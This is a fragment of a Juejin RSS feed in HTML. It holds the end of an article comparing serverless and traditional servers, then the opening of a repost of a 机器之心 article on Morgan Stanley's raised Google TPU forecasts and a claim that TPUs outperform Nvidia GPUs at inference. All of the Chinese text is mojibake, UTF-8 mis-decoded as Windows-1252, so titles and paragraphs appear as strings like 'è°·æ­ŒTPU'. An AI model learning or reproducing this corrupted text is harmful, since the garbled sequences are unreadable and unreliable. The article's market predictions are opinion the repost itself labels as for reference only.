é™æ‰©å±•</td></tr><tr><td><strong>æˆæœ¬æ¨¡å‹</strong></td><td>æŒ‰æœåŠ¡å™¨æ—¶é—´ä»˜è´¹ï¼ˆé—²æ—¶æµªè´¹ï¼‰</td><td>æŒ‰æ‰§è¡Œæ¬¡æ•°å’Œæ—¶é•¿ä»˜è´¹</td></tr><tr><td><strong>å¯åŠ¨é€Ÿåº¦</strong></td><td>æœåŠ¡å¸¸é©»ï¼Œå“åº”å¿«</td><td>å†·å¯åŠ¨å¯èƒ½æœ‰å»¶è¿Ÿ</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>é•¿è¿æ¥ã€é«˜é¢‘è°ƒç”¨</td><td>çªå‘æµé‡ã€å®šæ—¶ä»»åŠ¡ã€äº‹ä»¶å¤„ç†</td></tr><tr><td><strong>å¼€å‘ä½“éªŒ</strong></td><td>éœ€è¦å…³æ³¨åŸºç¡€è®¾æ–½</td><td>åªå…³æ³¨ä¸šåŠ¡ä»£ç </td></tr></tbody></table>
<h3 data-id="heading-20">æœ€ä½³å®è·µå»ºè®®</h3>
<ol>
<li><strong>å‡½æ•°è®¾è®¡</strong>ï¼šä¿æŒå‡½æ•°å•ä¸€èŒè´£ï¼Œç²’åº¦é€‚ä¸­ï¼ˆä¸è¦å¤ªå¤§ä¹Ÿä¸è¦å¤ªç¢ï¼‰</li>
<li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šå‡½æ•°æ— çŠ¶æ€ï¼ŒçŠ¶æ€å­˜å‚¨åˆ°æ•°æ®åº“æˆ–å¯¹è±¡å­˜å‚¨</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå®ç°é‡è¯•æœºåˆ¶å’Œæ­»ä¿¡é˜Ÿåˆ—</li>
<li><strong>å®‰å…¨æ€§</strong>ï¼šæœ€å°æƒé™åŸåˆ™ï¼Œä½¿ç”¨ IAM è§’è‰²æ§åˆ¶è®¿é—®</li>
<li><strong>ç›‘æ§å‘Šè­¦</strong>ï¼šè®¾ç½®å…³é”®æŒ‡æ ‡å‘Šè­¦ï¼ˆé”™è¯¯ç‡ã€å»¶è¿Ÿã€æˆæœ¬ï¼‰</li>
<li><strong>æµ‹è¯•ç­–ç•¥</strong>ï¼šæœ¬åœ°æ¨¡æ‹Ÿç¯å¢ƒ + äº‘ç«¯é›†æˆæµ‹è¯•</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è°·æ­ŒTPUæ€ç–¯äº†ï¼Œäº§èƒ½æš´æ¶¨120%ã€æ€§èƒ½4å€åŠæ‰“ï¼Œè‹±ä¼Ÿè¾¾è¿˜åå¾—ç¨³å—ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581664885862252554</link>    <guid>https://juejin.cn/post/7581664885862252554</guid>    <pubDate>2025-12-09T10:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581664885862252554" data-draft-id="7581667332306944038" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è°·æ­ŒTPUæ€ç–¯äº†ï¼Œäº§èƒ½æš´æ¶¨120%ã€æ€§èƒ½4å€åŠæ‰“ï¼Œè‹±ä¼Ÿè¾¾è¿˜åå¾—ç¨³å—ï¼Ÿ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2025-12-09T10:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœºå™¨ä¹‹å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è°·æ­ŒTPUæ€ç–¯äº†ï¼Œäº§èƒ½æš´æ¶¨120%ã€æ€§èƒ½4å€åŠæ‰“ï¼Œè‹±ä¼Ÿè¾¾è¿˜åå¾—ç¨³å—ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœºå™¨ä¹‹å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T10:31:55.000Z" title="Tue Dec 09 2025 10:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»28åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è‹±ä¼Ÿè¾¾çš„ã€ŒæŠ¤åŸæ²³ã€æ­£åœ¨å´©å¡Œï¼Ÿè°·æ­ŒTPUå‡­ä»€ä¹ˆè®©å·¨å¤´ä»¬ç–¯ç‹‚å€’æˆˆï¼Ÿ</p>
</blockquote>
<p>è°·æ­Œè¿™æ¬¡è¦åŠ¨çœŸæ ¼äº†ã€‚</p>
<p>æ‘©æ ¹å£«ä¸¹åˆ©æœ€æ–°ç ”æŠ¥é€éœ²äº†ä¸€ä¸ªé‡ç£…æ¶ˆæ¯ï¼šè°·æ­Œ TPU çš„äº§èƒ½å³å°†è¿æ¥çˆ†ç‚¸å¼å¢é•¿ã€‚æ›´å…³é”®çš„æ˜¯ï¼Œä¾›åº”é“¾é‚£è¾¹ä¼ æ¥ä¿¡å·ï¼ŒTPU ä¾›åº”çš„ä¸ç¡®å®šæ€§åŸºæœ¬è§£å†³äº†ï¼Œè¿™æ„å‘³ç€è°·æ­Œå¯ä»¥æ”¾å¼€æ‰‹è„šå¯¹å¤–å–èŠ¯ç‰‡äº†ã€‚</p>
<p>æ‘©æ ¹å£«ä¸¹åˆ©ç›´æ¥æŠŠé¢„æµ‹å¾€ä¸ŠçŒ›è°ƒï¼Œ2027 å¹´ TPU äº§é‡å°†è¾¾åˆ° 500 ä¸‡å—ï¼Œ2028 å¹´æ›´æ˜¯è¦å†²åˆ° 700 ä¸‡å—ã€‚è¦çŸ¥é“ï¼Œä¹‹å‰çš„é¢„æµ‹å¯æ˜¯ 300 ä¸‡å—å’Œ 320 ä¸‡å—ï¼Œè¿™æ³¢ä¸Šè°ƒå¹…åº¦åˆ†åˆ«é«˜è¾¾ 67% å’Œ 120%ã€‚æ¢å¥è¯è¯´ï¼Œæœªæ¥ä¸¤å¹´è°·æ­Œè¦ç”Ÿäº§ 1200 ä¸‡å— TPUï¼Œè€Œè¿‡å»å››å¹´åŠ èµ·æ¥æ‰ç”Ÿäº§äº† 790 ä¸‡å—ã€‚</p>
<p>è¿™ç¬”ç”Ÿæ„æœ‰å¤šèµšï¼Ÿæ‘©æ ¹å£«ä¸¹åˆ©ç»™å‡ºä¸€ä¸ªæµ‹ç®—ï¼Œè°·æ­Œæ¯å–å‡º 50 ä¸‡å— TPU èŠ¯ç‰‡ï¼Œ2027 å¹´å°±èƒ½è¿›è´¦çº¦ 130 äº¿ç¾å…ƒï¼Œæ¯è‚¡æ”¶ç›Šå¢åŠ  0.40 ç¾å…ƒã€‚</p>
<p>æˆ˜ç•¥å±‚é¢çœ‹ï¼Œè°·æ­Œçš„æ‰“æ³•ä¹Ÿå¾ˆæ˜ç¡®ï¼Œç›´æ¥å‘ç¬¬ä¸‰æ–¹æ•°æ®ä¸­å¿ƒé”€å”® TPUï¼Œä½œä¸ºè°·æ­Œäº‘å¹³å° (GCP) ä¸šåŠ¡çš„é‡è¦è¡¥å……ã€‚è™½ç„¶å¤§éƒ¨åˆ† TPU ä»ä¼šç”¨åœ¨è°·æ­Œè‡ªå®¶çš„ AI è®­ç»ƒå’Œäº‘æœåŠ¡ä¸Šï¼Œä½†å¦‚æ­¤å¤§çš„äº§èƒ½å‚¨å¤‡ï¼Œæ˜¾ç„¶æ˜¯åœ¨ä¸ºæ›´å¹¿æ³›çš„å•†ä¸šåŒ–åšå‡†å¤‡ã€‚</p>
<p>æ‘©æ ¹å£«ä¸¹åˆ©è®¤ä¸ºï¼Œè¿™äº›è¿¹è±¡éƒ½æ˜¯è°·æ­Œ TPU é”€å”®æˆ˜ç•¥çš„æ—©æœŸä¿¡å·ã€‚çœ¼ä¸‹å…¨è¡Œä¸šå¯¹å…ˆè¿› AI ç®—åŠ›éœ€æ±‚çˆ†æ£šï¼Œè°·æ­Œæ˜¾ç„¶ä¸æƒ³é”™è¿‡è¿™æ³¢çº¢åˆ©ã€‚</p>
<p>å— AI èŠ¯ç‰‡éœ€æ±‚å¼ºåŠ²çš„å½±å“ï¼Œæ‘©æ ¹å£«ä¸¹åˆ©é¡ºæ‰‹æŠŠè”å‘ç§‘è¯„çº§ä¸Šè°ƒè‡³ã€Œå¢æŒã€ï¼Œç†ç”±æ˜¯æ•´ä¸ªèŠ¯ç‰‡ä¾›åº”é“¾éƒ½åœ¨å—ç›Šã€‚</p>
<p>è‹±ä¼Ÿè¾¾åœ¨ AI èŠ¯ç‰‡å¸‚åœºä¸€å®¶ç‹¬å¤§çš„æ ¼å±€ï¼Œå¯èƒ½è¦è¿æ¥çœŸæ­£çš„æŒ‘æˆ˜è€…äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68d5f45acce14933a35fc9db856efa2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=bxxCmS4usvhRBTacyznHtBF1GuM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ï¼ˆåŠ¨å›¾æ¥è‡ªåšä¸»èµ›åšè½©Albert)</p>
<p>æœ€è¿‘ï¼Œè°·æ­Œ TPU ä¸è‹±ä¼Ÿè¾¾ GPU çš„æŠ€æœ¯è¾ƒé‡æˆä¸ºä¸šå†…çƒ­è®®è¯é¢˜ã€‚æˆ‘ä»¬å…³æ³¨åˆ°ä¸€ç¯‡é¢˜ä¸ºã€Š2025 å¹´ AI æ¨ç†æˆæœ¬ï¼šè°·æ­Œ TPU ä¸ºä½•æ¯”è‹±ä¼Ÿè¾¾ GPU æ€§èƒ½é«˜å‡º 4 å€ã€‹çš„æŠ¥é“ï¼Œå…¨é¢è§£æäº†ä¸¤è€…çš„æŠ€æœ¯å·®å¼‚å’Œæ€§èƒ½å¯¹æ¯”ã€‚è‡³äºæŠ¥é“ä¸­çš„è§‚ç‚¹ï¼Œä»…ä¾›å‚è€ƒã€‚</p>
<p>ä»¥ä¸‹æ˜¯æœºå™¨ä¹‹å¿ƒç¼–è¯‘ï¼š</p>
<p>åœ¨æ¿€çƒˆçš„ AI éœ¸ä¸»ä¹‹äº‰ä¸­ï¼Œè‹±ä¼Ÿè¾¾é•¿æœŸä»¥æ¥ä¸€ç›´ç¨³åéœ¸ä¸»åœ°ä½ã€‚å…¶ GPU æ¨åŠ¨äº†æœºå™¨å­¦ä¹ çš„çˆ†ç‚¸å¼å¢é•¿ï¼Œå°†æŠ½è±¡çš„ç¥ç»ç½‘ç»œå˜ä¸ºç°å®ï¼Œå¹¶æ‰“é€ äº†ä¸€ä¸ªä»·å€¼æ•°ä¸‡äº¿ç¾å…ƒçš„å•†ä¸šå¸å›½ã€‚ä½†éšç€ AI æ ¼å±€çš„æ¼”å˜ï¼Œè‹±ä¼Ÿè¾¾çš„ã€Œç›”ç”²ã€ä¹Ÿå¼€å§‹å‡ºç°è£‚ç—•ã€‚</p>
<p>ä»æ¨¡å‹è®­ç»ƒï¼ˆè‹±ä¼Ÿè¾¾çš„å¼ºé¡¹ï¼‰åˆ°æ¨ç†ï¼ˆå³è¿™äº›æ¨¡å‹çš„å®æ—¶åº”ç”¨ï¼‰ï¼Œå¸‚åœºæ ¼å±€æ­£åœ¨å‘ç”Ÿé‡å¡‘ã€‚è€Œå¼•é¢†è¿™åœºå˜é©çš„ï¼Œæ­£æ˜¯è°·æ­Œçš„å¼ é‡å¤„ç†å•å…ƒï¼ˆTPUï¼‰ï¼Œå®ƒå¸¦æ¥çš„æ— ä¸ä¼¦æ¯”çš„æ•ˆç‡å’Œæˆæœ¬ä¼˜åŠ¿ï¼Œæˆ–è®¸å°†ç»ˆç»“è‹±ä¼Ÿè¾¾çš„å„æ–­åœ°ä½ã€‚</p>
<p>åˆ° 2030 å¹´ï¼Œæ¨ç†å°†æ¶ˆè€— 75% çš„äººå·¥æ™ºèƒ½è®¡ç®—èµ„æºï¼Œåˆ›é€ ä¸€ä¸ªè§„æ¨¡è¾¾ 2550 äº¿ç¾å…ƒçš„å¸‚åœºï¼Œå¹¶ä»¥æ¯å¹´ 19.2% çš„é€Ÿåº¦å¢é•¿ã€‚ç„¶è€Œï¼Œå¤§å¤šæ•°å…¬å¸ä»ç„¶ä»¥è®­ç»ƒæˆæœ¬ä¸ºä¼˜åŒ–ç›®æ ‡ã€‚</p>
<p>è¿™å¹¶éç‚’ä½œï¼Œè€Œæ˜¯ç»æµå› ç´ ã€‚è®­ç»ƒæ˜¯ä¸€æ¬¡æ€§çš„å†²åˆºï¼Œè€Œæ¨ç†åˆ™æ˜¯ä¸€åœºæ°¸æ— æ­¢å¢ƒçš„é©¬æ‹‰æ¾ã€‚éšç€åƒ OpenAI è¿™æ ·çš„å…¬å¸ç–²äºåº”å¯¹é£æ¶¨çš„æ¨ç†æˆæœ¬ï¼ˆé¢„è®¡ä»… 2024 å¹´å°±å°†è¾¾åˆ° 23 äº¿ç¾å…ƒï¼Œè¿œè¶…è®­ç»ƒ GPT-4 çš„ 1.5 äº¿ç¾å…ƒæˆæœ¬ï¼‰ï¼Œè°·æ­Œçš„ TPU å‡­å€Ÿå…¶é«˜æ€§ä»·æ¯”è„±é¢–è€Œå‡ºã€‚åœ¨è¿™ç¯‡æ·±åº¦åˆ†æä¸­ï¼Œä½œè€…å°†æ¢è®¨ TPU å¦‚ä½•èµ¢å¾—æ¨ç†ä¹‹æˆ˜ï¼Œå¹¶ä»¥è¡Œä¸šé¢†å¯¼è€…çš„å®é™…è¿ç§»æ¡ˆä¾‹ä¸ºä½è¯ï¼ŒåŒæ—¶è§£é‡Šä¸ºä½•è¿™ä¸€è½¬å˜é¢„ç¤ºç€è‹±ä¼Ÿè¾¾å³å°†èµ°å‘è¡°è½ã€‚</p>
<p>AI ç®—åŠ›çš„åˆ†é‡ï¼šè®­ç»ƒä¸æ¨ç†</p>
<p>è¦äº†è§£æ­£åœ¨å‘ç”Ÿçš„å·¨å¤§è½¬å˜ï¼Œæˆ‘ä»¬é¦–å…ˆå¿…é¡»å‰–æäººå·¥æ™ºèƒ½è®¡ç®—çš„ä¸¤å¤§æ”¯æŸ±ï¼šè®­ç»ƒå’Œæ¨ç†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95a71fe952d042cf81a8e3e728f02966~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=c5BinNQ2wUnT%2BxVsEbmLLFgXqk8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è®­ç»ƒï¼šè‹±ä¼Ÿè¾¾çš„å·…å³°ä¹‹ä½œ</p>
<p>è®­ç»ƒæ˜¯å°†æµ·é‡æ•°æ®é›†è¾“å…¥ç¥ç»ç½‘ç»œï¼Œä»¥ã€Œæ•™ä¼šã€å®ƒä»¬æ¨¡å¼ã€é¢„æµ‹å’Œè¡Œä¸ºçš„å¯†é›†å‹è¿‡ç¨‹ã€‚å®ƒéœ€è¦å¤§é‡çš„è®¡ç®—èµ„æºï¼Œéœ€è¦æ•°åƒä¸ª GPU è¿›è¡Œå¹¶è¡Œå¤„ç†ï¼Œä»¥å®ŒæˆçŸ©é˜µä¹˜æ³•å’Œåå‘ä¼ æ’­ç­‰è¿ç®—ã€‚è‹±ä¼Ÿè¾¾æ­£æ˜¯å‡­å€Ÿæ­¤å»ºç«‹äº†è‡ªå·±çš„å¸å›½ã€‚å…¶ CUDA è½¯ä»¶ç”Ÿæ€ç³»ç»Ÿå’Œ Hopper æ¶æ„ï¼ˆä¾‹å¦‚ H100 GPUï¼‰åœ¨å¤„ç†è¿™ç§é«˜å¼ºåº¦è®¡ç®—ä»»åŠ¡æ–¹é¢è¡¨ç°å‡ºè‰²ï¼Œä»è€Œå®ç°äº† GPT-4 å’Œç¨³å®šæ‰©æ•£ç­‰çªç ´æ€§æˆæœã€‚</p>
<p>ä½†è®­ç»ƒæ˜¯æœ‰é™çš„ï¼Œä¸€æ—¦æ¨¡å‹è¢«è®­ç»ƒå®Œæˆï¼Œç¹é‡çš„å·¥ä½œå°±åœæ­¢äº†ã€‚æˆæœ¬æ˜¯å‰ç½®çš„ï¼šå•æ¬¡è¿è¡Œå¯èƒ½æ¶ˆè€—æ•°ç™¾ä¸‡ GPU å°æ—¶ï¼Œä½†å®ƒæ˜¯æœ‰é™çš„ã€‚å¯¹äº GPT-4 æ¥è¯´ï¼Œè¿™ç¬”ä¸€æ¬¡æ€§è´¦å•è¾¾åˆ°äº† 1.5 äº¿ç¾å…ƒã€‚è‹±ä¼Ÿè¾¾çš„ GPU å‡­å€Ÿå…¶åœ¨å›¾å½¢ã€æ¨¡æ‹Ÿå’Œé€šç”¨è®¡ç®—æ–¹é¢çš„å¤šåŠŸèƒ½æ€§ï¼Œæˆä¸ºè¿™ä¸€é˜¶æ®µçš„é¦–é€‰ã€‚åˆ° 2023 å¹´ï¼Œè‹±ä¼Ÿè¾¾æ§åˆ¶äº†è¶…è¿‡ 80% çš„ AI èŠ¯ç‰‡å¸‚åœºï¼Œä»…æ•°æ®ä¸­å¿ƒé”€å”®å°±å¸¦æ¥ 600 äº¿ç¾å…ƒçš„æ”¶å…¥ã€‚</p>
<p>æ¨ç†ï¼šæ°¸æ— æ­¢å¢ƒçš„é’±å‘</p>
<p>æ¨ç†åˆ™å®Œå…¨ä¸åŒã€‚è¿™æ˜¯éƒ¨ç½²é˜¶æ®µï¼šæ¯æ¬¡ ChatGPT æŸ¥è¯¢ã€å›¾åƒç”Ÿæˆæˆ–æ¨èç®—æ³•éƒ½ä¼šåœ¨æ–°æ•°æ®ä¸Šè¿è¡Œå·²è®­ç»ƒçš„æ¨¡å‹ã€‚ä¸è®­ç»ƒä¸åŒï¼Œæ¨ç†æ˜¯æŒç»­è¿›è¡Œçš„ï¼šå¤„ç†çš„æ¯ä¸€ä¸ª tokenã€æ¯ä¸€æ¬¡ç”¨æˆ·äº¤äº’ã€æ¯ä¸€ç§’çš„æ“ä½œéƒ½ä¼šäº§ç”Ÿæˆæœ¬ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæ®‹é…·çš„æ•°å­¦è®¡ç®—å°†æ­ç¤ºçœŸç›¸ã€‚æ¨ç†éœ€æ±‚å¹¶éä¸€æ¬¡æ€§çš„ï¼Œè€Œæ˜¯éšç€ä½¿ç”¨é‡çš„å¢é•¿è€Œå‘ˆæŒ‡æ•°çº§å¢é•¿ã€‚OpenAI 2024 å¹´çš„æ¨ç†æ”¯å‡ºé£™å‡è‡³ 23 äº¿ç¾å…ƒï¼Œæ˜¯ GPT-4 è®­ç»ƒæˆæœ¬çš„ 15 å€ã€‚åœ¨å…¨çƒèŒƒå›´å†…ï¼Œéšç€ AI é›†æˆåˆ°ä»è‡ªåŠ¨é©¾é©¶æ±½è½¦åˆ°ä¸ªæ€§åŒ–å¹¿å‘Šç­‰å„ç§åº”ç”¨ä¸­ï¼Œæœºå™¨å­¦ä¹ æ¨ç†æˆæœ¬æ­£åœ¨çˆ†ç‚¸å¼å¢é•¿ã€‚åˆ†æå¸ˆä¼°è®¡ï¼Œåˆ° 2026 å¹´ï¼Œæ¨ç†éœ€æ±‚å°†æ¯”è®­ç»ƒéœ€æ±‚é«˜å‡º 118 å€ã€‚åˆ° 2030 å¹´ï¼Œæ¨ç†è®¡ç®—å¯èƒ½å äººå·¥æ™ºèƒ½æ€»è®¡ç®—é‡çš„ 75%ï¼Œä»è€Œæ¨åŠ¨ 7 ä¸‡äº¿ç¾å…ƒçš„åŸºç¡€è®¾æ–½æŠ•èµ„ã€‚</p>
<p>è‹±ä¼Ÿè¾¾çš„ GPU è™½ç„¶é’ˆå¯¹è®­ç»ƒçš„é«˜ååé‡å¹¶è¡Œæ€§è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä½†åœ¨è¿™é‡Œè¡¨ç°ä¸ä½³ã€‚å®ƒä»¬ä¼šæ¶ˆè€—å¤§é‡çš„ç”µåŠ›å’Œå†…å­˜æ¥å¤„ç†æŒç»­çš„æŸ¥è¯¢ï¼Œå¯¼è‡´æ•ˆç‡ä½ä¸‹ã€‚è¿›å…¥æ¨ç†æ—¶ä»£ï¼šåœ¨æœªæ¥ï¼Œæ¯æ¬¡æŸ¥è¯¢çš„æˆæœ¬è‡³å…³é‡è¦ã€‚</p>
<p>è°·æ­Œçš„ TPUï¼šä¸“ä¸ºæ¨ç†æ—¶ä»£è€Œè®¾è®¡</p>
<p>è°·æ­Œå¹¶éå¶ç„¶å‘ç°äº† TPUã€‚å®ƒä¸ºè‡ªèº«åºå¤§çš„ç½‘ç»œå¸å›½ç²¾å¿ƒæ‰“é€ äº† TPUï¼Œä¸ºæœç´¢ã€YouTube æ¨èå’Œå…¨çƒè§„æ¨¡çš„ç¿»è¯‘æœåŠ¡æä¾›å¼ºå¤§æ”¯æŒã€‚TPU äº 2016 å¹´æ¨å‡ºï¼Œæ˜¯ä¸€ç§ä¸“ç”¨é›†æˆç”µè·¯ï¼ˆASICï¼‰ï¼Œä¸“ä¸ºå¼ é‡è¿ç®—è€Œè®¾è®¡ï¼Œè€Œå¼ é‡è¿ç®—æ­£æ˜¯äººå·¥æ™ºèƒ½çš„æ ¸å¿ƒæ•°å­¦è¿ç®—ã€‚</p>
<p>æ¶æ„ä¼˜åŠ¿ï¼šä¸ºä»€ä¹ˆ TPU èƒ½ç¢¾å‹æ¨ç†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81339f62ed4c461f99d8ac4767c80b88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765881115&amp;x-signature=xHKkQzdjB4eGwVdPmUzC2LSrUXc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
